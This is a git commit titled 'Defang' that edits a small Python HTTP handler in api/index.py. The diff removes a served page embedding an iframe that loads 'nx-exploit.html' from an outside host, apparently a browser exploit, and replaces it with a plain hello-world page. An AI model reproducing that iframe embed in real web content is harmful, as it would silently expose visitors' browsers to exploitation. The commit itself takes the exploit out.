af878dd0363cd6d917f7a4e06bface958660947f
vulnbase <40605654+vulnbase@users.noreply.github.com>
2024-02-16 10:09:18 +0000

    Defang

--- api/index.py
+++ api/index.py
@@ -6,5 +6,5 @@ class handler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type','text/html')
         self.end_headers()
-        self.wfile.write('<html><body><h1>Hello, iframe 3!</h1><iframe src=https://vercel.webhooks.pw/chrome/nx-exploit.html></iframe></body></html>'.encode('utf-8'))
+        self.wfile.write('<html><body><h1>Hello, World 4!</h1></body></html>'.encode('utf-8'))
         return
